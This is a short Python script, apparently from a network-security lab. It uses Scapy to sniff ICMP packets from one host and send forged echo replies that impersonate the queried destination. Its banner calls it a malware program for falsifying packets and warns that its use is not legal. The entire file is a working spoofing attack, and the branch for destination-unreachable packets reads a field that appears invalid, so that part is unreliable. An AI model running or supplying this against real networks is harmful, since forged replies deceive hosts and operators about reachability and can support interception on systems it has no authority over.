1.	from scapy.all import *  
2.	#and packet[ICMP].type==8 and (packet[ICMP].type==8 or packet[ICMP].type==3)  
3.	def spoof(packet):  
4.	    if ICMP in packet and (packet[ICMP].type==8 or packet[ICMP].type==3):  
5.	          
6.	        print("\nInfo below belongs to the original packet request.")  
7.	        print("Source IP: ",packet[IP].src)  
8.	        print("Destination IP: ",packet[IP].dst)  
9.	  
10.	        print("\n")  
11.	        print("Starting to falsify copy of reply packet.")  
12.	          
13.	        if packet[ICMP].type==3:  
14.	            d = packet[ICMP].dst  
15.	        else:  
16.	            d=packet[IP].dst  
17.	        ip = IP(src=d, dst=packet[IP].src, ihl = packet[IP].ihl)  
18.	        icmp = ICMP(type=0,id=packet[ICMP].id, seq = packet[ICMP].seq)  
19.	        data = packet[Raw].load  
20.	        falsepkt = ip/icmp/data  
21.	        print("\n")  
22.	        print("Info below belongs to the false reply packet.")  
23.	        print("Source IP: ",falsepkt[IP].src)  
24.	        print("Destination IP: ",falsepkt[IP].dst)  
25.	        send(falsepkt,verbose=0)  
26.	          
27.	print("Welcome!\nThis is a malware program used to falsify packets!\nUse this program careful-ly for it is not legal!\nAny use is on the user responsibilty alone!\nHave fun! :)\n...")  
28.	  
29.	pkt = sniff(iface=['lo','enp0s3'],filter='icmp and src host 10.0.2.5', prn = spoof)  
